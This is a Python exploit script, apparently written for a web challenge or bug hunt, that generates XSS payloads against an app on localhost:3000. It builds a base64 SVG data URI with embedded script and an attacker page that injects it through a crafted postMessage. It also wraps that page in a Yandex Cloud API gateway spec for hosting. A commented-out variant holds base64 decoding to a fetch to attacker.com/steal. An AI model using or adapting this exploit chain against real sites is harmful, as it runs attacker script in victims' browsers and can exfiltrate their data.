from urllib.parse import quote
from base64 import b64encode
import textwrap

base = "http://localhost:3000/"
name = "embed"
# payload = "fetch('http://localhost:3000/asdasd');"
payload = "alert(1)"

src = f'''<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.0" x="0" y="0" width="194" height="200" id="xss"><script type="text/ecmascript">{payload}</script></svg>'''
src = 'data:image/svg+xml;base64,' + b64encode(src.encode()).decode()

jsbin_p = f"<{name} src=\"{src}\">"
url_p = f"{base}?name={quote(name)}&src={quote(src)}"

print(jsbin_p)
print(url_p)

raw_html = '''
<iframe id="a" src="http://127.0.0.1:3000"></iframe>
<script>
const newWindow = window.open("http://localhost:3000/about", "_blank", "width=1,height=1,left=-1000,top=-1000");
setTimeout(() => {
  document.getElementById("a").contentWindow.postMessage({
    type: "SET_B2B_PARTNER_ICON",
    payload: { name: "NAME", src: "SRC" }
  }, "*");
}, 1000);
</script>
'''
# raw_html='''

# <iframe id="a" src="http://127.0.0.1:3000"></iframe>
# <script>
#   const newWindow = window.open("http://localhost:3000/about", "_blank", "width=1,height=1,left=-1000,top=-1000");

#   setTimeout(() => {
#     document.getElementById("a").contentWindow.postMessage({
#       type: "SET_B2B_PARTNER_ICON",
#       payload: {
#         name: "script",
#         src: "data:text/javascript;base64,ZmV0Y2goJ2h0dHA6Ly9hdHRhY2tlci5jb20vc3RlYWwnKTs="
#       }
#     }, "http://127.0.0.1:3000"); // ← Важно: указать точный origin
#   }, 1000);
# </script>
# '''
dedented = textwrap.dedent(raw_html).replace('NAME', name).replace('SRC', src)
indented_html = textwrap.indent(dedented, '            ')

html_p = dedented  # for print, unindented
print(html_p)

openapi_p = '''openapi: 3.0.0
info:
  title: Sample API
  version: 1.0.0
servers:
- url: https://d5d04v3t472k3dki3oha.kf69zffa.apigw.yandexcloud.net
paths:
  /:
    get:
      x-yc-apigateway-integration:
        type: dummy
        content:
          '*': |
''' + indented_html + '''
        http_code: 200
        http_headers:
          Content-Type: text/html; charset=utf-8'''

print(openapi_p)